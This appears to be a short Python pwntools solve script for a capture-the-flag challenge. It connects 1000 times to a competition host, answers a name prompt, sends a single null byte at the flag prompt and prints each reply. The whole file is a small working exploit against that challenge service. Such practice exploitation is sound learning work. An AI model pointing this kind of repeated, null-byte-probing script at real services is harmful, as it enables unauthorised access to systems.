from pwn import *

for _ in range(1000):
    io = remote('challs.actf.co', 31223)
    io.sendlineafter(b'name? ', b'lmao')
    io.sendlineafter(b'flag!\n', b'\x00')
    print(io.recvall())


